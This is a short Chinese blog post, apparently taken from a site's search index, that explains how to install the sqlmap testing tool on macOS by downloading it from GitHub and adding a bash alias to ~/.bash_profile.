+<h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><ol>
+<li>Terminal 或者 Iterm </li>
+<li>Python 环境</li>
+</ol>
+<h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><ol>
+<li><p>先去github上面下载并解压sqlmap相关文件</p>
+<p>url：<a href="https://github.com/sqlmapproject/sqlmap.git">https://github.com/sqlmapproject/sqlmap.git</a></p>
+</li>
+<li><p>打开 Terminal(这里以terminal为例，因为terminal为系统自带终端)<br>输入 vi ~&#x2F;.bash_profile</p>
+<span id="more"></span>
+<p><img src="https://img-blog.csdnimg.cn/20191002103705232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>按 E 进行编辑</p>
+</li>
+</ol>
+<p>输入 alias sqlmap&#x3D;’python &#x2F;User&#x2F;***&#x2F;tools&#x2F;sqlmap-master&#x2F;sqlmap.py’</p>
+<p>此时 python后要根据自己所下载的sqlmap.py文件的具体位置来填写</p>
+<p>具体sqlmap.py文件的位置可以这样来找：打开所下载的sqlmap的文件夹后可以发现有sqlmap.py文件<br><img src="https://img-blog.csdnimg.cn/20191002103720670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>右键选择 拷贝sqlmap.py   此时的拷贝为拷贝的此sqlmap.py的文件的物理名，即文件的位置</p>
+<p>把上述指令中的python 后的地址全部删去后粘贴上刚刚复制的sqlmap.py的位置即可</p>
+<p>ps：要注意上述指令sqlmap&#x3D; 后 等号的前后不能有空格并且等号后面的位置要使用两个单引号扩起来(输入法在英文状态下的单引号)</p>
+<p>改完地址后 在export path 下一行 添加export  alias<br><img src="https://img-blog.csdnimg.cn/20191002103915123.png" alt="在这里插入图片描述"><br>添加完成后，按esc取消输入模式  再输入 : wq 按回车保存并退出到根目录</p>
+<ol start="3">
+<li>返回到根目录后输入指令 source ~&#x2F;.bash_profile  使bash重新载入配置令刚才命令生效</li>
+<li>一切完成后 在terminal中 输入 sqlmap启动</li>
+</ol>
+<p><img src="https://img-blog.csdnimg.cn/2019100210374111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>显示此界面即为搭建sqlmap环境成功</p>
+<p>开始你愉快的sql注入之旅吧 : )</p>
 ]]></content>
   </entry>
 </search>
